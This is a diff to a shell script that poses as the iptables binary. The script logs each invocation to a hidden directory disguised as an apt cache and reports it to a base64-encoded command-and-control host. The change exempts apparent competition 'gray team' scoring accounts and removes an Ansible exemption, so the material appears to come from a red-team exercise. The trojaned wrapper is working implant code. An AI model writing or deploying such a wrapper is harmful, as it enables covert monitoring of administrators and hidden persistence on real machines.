@@ -5,6 +5,11 @@ else
     REAL_IPTABLES="/usr/sbin/iptables"
 fi
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_IPTABLES "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
@@ -26,10 +31,6 @@ _log_remote() {
 
 INVOKING_USER=$(whoami)
 
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_IPTABLES "$@"
-fi
 HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
 HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
 COMMAND_ARGS="$*"
